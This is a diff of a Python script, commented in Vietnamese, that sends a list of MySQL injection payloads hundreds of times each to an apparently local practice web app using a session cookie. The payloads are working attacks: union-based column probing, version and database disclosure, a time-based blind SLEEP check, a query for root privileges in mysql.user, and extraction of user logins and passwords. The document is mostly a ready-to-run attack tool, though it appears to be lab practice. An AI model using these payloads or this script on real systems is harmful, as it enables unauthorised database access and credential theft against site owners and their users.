@@ -4,24 +4,26 @@ import urllib.parse
 
 # Danh sách các truy vấn SQL Injection bạn muốn thực hiện
 queries = [
-    "uyen ' union select 1,2,3,4,5,6,7 #",
-    "uyen ' union select 1, user(),3,4,5,6,7 #",
-    "uyen ' union select 1, (select GROUP_CONCAT(table_name,'\\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #",
-    "uyen ' union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #",
-    "uyen' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #"
+    "'order by 7 -- -",
+    "'order by 8 -- -",
+    "' union select 1,version(),3,4,database(),6,7 -- #",
+    "uyen' AND (SELECT IF((SELECT LENGTH(user()) > 10), SLEEP(5), 0)) #",
+    "uyen ' union select 1, version(),3,4,5,6,7 #",
+    "uyen ' union select 1, (select group_concat(grant_priv) from mysql.user where user = 'root'), 3,4,5,6,7 #",
+    "uyen%20'%20union%20select%201,2,3,4,5,6,7%20--%20",
+    "uyen ' union select 1, (select login from users where id = 1), (select password from users where id = 1), 4,5,6,7 #"
 ]
-
 # URL cơ bản của trang web
 base_url = "http://192.168.10.10/sqli_10-2.php"
 
 # Cookie của bạn (PHPSESSID và security_level)
 cookies = {
-    "PHPSESSID": "0k6gg6biqflmnbb39ttveugod1",
+    "PHPSESSID": "hsgaj3d1fdmnp9mhgq0h7410e7",
     "security_level": "0"
 }
 
 # Số lần request cần thực hiện
-num_requests = 600
+num_requests = 440
 
 # Hàm gửi request cho từng query
 def send_requests():
@@ -35,13 +37,12 @@ def send_requests():
                 # Thực hiện request với cookie
                 response = requests.get(url, cookies=cookies)
                 # In ra kết quả (status code)
-                print(f"Request {i+1}, status: {response.status_code}")
+                print(f"Request {i+1} thanh cong")
             except Exception as e:
                 # In ra lỗi nếu có
-                print(f"Error request {i+1}")
+                print(f" request {i+1} that bai")
             # Thêm delay nếu cần
-            time.sleep(0.5)  # Thay đổi thời gian delay nếu muốn
+            time.sleep(0.1)  # Thay đổi thời gian delay nếu muốn
 
 # Bắt đầu thực hiện requests
 send_requests()
-
